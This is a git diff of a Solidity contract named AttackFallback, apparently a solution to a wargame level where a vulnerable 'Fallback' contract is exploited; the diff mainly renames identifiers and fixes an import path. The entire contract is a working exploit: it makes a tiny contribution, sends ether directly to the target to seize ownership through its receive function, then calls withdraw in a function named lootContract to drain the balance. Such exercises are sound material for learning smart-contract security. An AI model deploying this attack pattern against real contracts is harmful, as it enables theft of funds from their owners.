@@ -1,31 +1,33 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import "fallback.sol";
+import "./fallback.sol";
 
 contract AttackFallback {
 
-    Fallback public fallback_contract;
+    Fallback public fallbackContract;
 
-    constructor(address fallback_contract_address){
-        fallback_contract = Fallback(payable(fallback_contract_address));
+    constructor(address fallbackContractAddress) {
+        fallbackContract = Fallback(payable(fallbackContractAddress));
     }
 
-    function make_contribution() public {
-        fallback_contract.contribuite{value: 3 wei}();
+    function makeContribution() public {
+        fallbackContract.contribuite{value: 3 wei}();
     }
 
-    function get_contribution() public view returns (uint) {
-        return fallback_contract.getContribution();
+    function getContribution() public view returns (uint) {
+        return fallbackContract.getContribution();
     }
 
-    function own_the_contract() public {
-        payable(address(fallback_contract)).transfer(3 wei);
+    function ownTheContract() public {
+        payable(address(fallbackContract)).transfer(3 wei);
     }
 
-    function loot_contract() public {
-        fallback_contract.withdraw();
+    function lootContract() public {
+        fallbackContract.withdraw();
     }
 
-    receive() external payable {}
+    receive() external payable {
+        return ;
+    }
 }
